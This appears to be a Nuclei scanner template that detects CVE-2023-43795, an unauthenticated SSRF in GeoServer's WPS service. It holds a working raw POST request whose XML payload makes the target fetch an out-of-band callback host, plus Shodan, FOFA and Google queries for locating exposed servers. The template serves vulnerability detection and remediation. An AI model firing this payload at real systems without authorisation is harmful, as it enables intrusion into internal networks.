http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, 'http')
    - contains_all(to_lower(interactsh_request), '{{string}}','{{value}}')
    - status_code == 200
    type: dsl
  payloads:
    path:
    - /wms
    - /geoserver/wms
  raw:
  - "POST {{path}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n\
    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<wps:Execute version=\"1.0.0\" service=\"\
    WPS\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns=\"http://www.opengis.net/wps/1.0.0\"\
    \n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns:wps=\"http://www.opengis.net/wps/1.0.0\"\
    \n  xmlns:ows=\"http://www.opengis.net/ows/1.1\"\n  xmlns:gml=\"http://www.opengis.net/gml\"\
    \n  xmlns:ogc=\"http://www.opengis.net/ogc\"\n  xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\"\
    \n  xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n        xsi:schemaLocation=\"\
    http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\"\
    >\n  <ows:Identifier>JTS:area</ows:Identifier>\n  <wps:DataInputs>\n    <wps:Input>\n\
    \      <ows:Identifier>geom</ows:Identifier>\n      <wps:Reference mimeType=\"\
    application/json\" xlink:href=\"https://{{oast}}\" method=\"GET\">\n        <wps:Header\
    \ key=\"{{string}}\" value=\"{{value}}\"/>\n      </wps:Reference>\n    </wps:Input>\n\
    \  </wps:DataInputs>\n  <wps:ResponseForm>\n    <wps:RawDataOutput>\n      <ows:Identifier>result</ows:Identifier>\n\
    \    </wps:RawDataOutput>\n  </wps:ResponseForm>\n</wps:Execute>\n"
  stop-at-first-match: true
id: CVE-2023-43795
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43795
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-918
    epss-percentile: 0.9953
    epss-score: 0.89488
  description: 'GeoServer is an open source software server written in Java that allows
    users to share and edit geospatial data. The OGC Web Processing Service (WPS)
    specification is designed to process information from any server using GET and
    POST requests. This presents the opportunity for Server Side Request Forgery.
    This vulnerability has been patched in version 2.22.5 and 2.23.2.

    '
  impact: 'Unauthenticated attackers can exploit SSRF through the WPS service to make
    arbitrary HTTP requests and access internal network resources, potentially compromising
    the entire GeoServer infrastructure and accessing sensitive geospatial data.

    '
  metadata:
    fofa-query:
    - app="GeoServer"
    - app="geoserver"
    - title="geoserver"
    google-query: intitle:"geoserver"
    max-request: 2
    product: geoserver
    shodan-query:
    - title:"GeoServer"
    - http.title:"geoserver"
    vendor: osgeo
    verified: true
  name: GeoServer WPS - Server Side Request Forgery
  reference:
  - https://www.synacktiv.com/advisories/unauthenticated-server-side-request-forgery-crlf-injection-in-geoserver-wms.html
  - https://github.com/geoserver/geoserver/security/advisories/GHSA-5pr3-m5hm-9956
  - https://nvd.nist.gov/vuln/detail/CVE-2023-43795
  - https://github.com/20142995/sectool
  remediation: 'Update GeoServer to version 2.22.5 or 2.23.2 or later that validates
    URLs in WPS requests and restricts access to authorized external resources only.

    '
  severity: critical
  tags: cve2023,cve,geoserver,ssrf,oast,oos,osgeo,vkev,vuln
variables:
  oast: '{{interactsh-url}}'
  string: '{{to_lower(rand_text_alpha(4))}}'
  value: '{{to_lower(rand_text_alpha(5))}}'
